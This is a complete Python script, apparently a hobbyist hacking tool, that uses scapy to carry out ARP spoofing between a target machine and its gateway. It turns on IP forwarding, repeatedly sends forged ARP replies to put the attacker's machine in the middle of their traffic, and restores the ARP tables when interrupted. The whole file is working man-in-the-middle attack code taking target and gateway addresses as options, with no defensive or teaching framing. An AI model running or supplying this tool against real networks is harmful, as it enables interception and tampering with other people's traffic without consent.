## Importing libraries

import os
import scapy.all as scapy
import time
import optparse

## Important!!

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

## This Function for Get MAC address with ip address
def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

## This Function for Arp Poisoning
def arp_poisoning(ip_1, ip_2):
    mac_address=get_mac_address(ip_1)
    arp_response = scapy.ARP(op=2, pdst=ip_1, hwdst=mac_address,psrc=ip_2)
    scapy.send(arp_response,verbose=False)

## This function for back to default
def arp_reset(other_ip_1,other_ip_2):
    target_mac_address=get_mac_address(other_ip_1)
    gateway_mac_address =get_mac_address(other_ip_2)

    arp_response = scapy.ARP(op=2, pdst=other_ip_1, hwdst=target_mac_address,psrc=other_ip_2,hwsrc=gateway_mac_address)
    scapy.send(arp_response,verbose=False,count=6)

def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t","--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g","--gateway", dest="gateway_ip",help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if (not options.target_ip) or (not options.gateway_ip):
        print("Please enter target ip and gateway ip !!")

    return options

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

## Forever loop and Handling Errors
try:
    while True:
        i=2
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        print("\rSending packets...",end=f"-{i}")
        time.sleep(5)
        i+=2
except KeyboardInterrupt:
    print("\nQuit and Reset")
    arp_reset(user_target_ip,user_gateway_ip)
    arp_reset(user_gateway_ip,user_target_ip)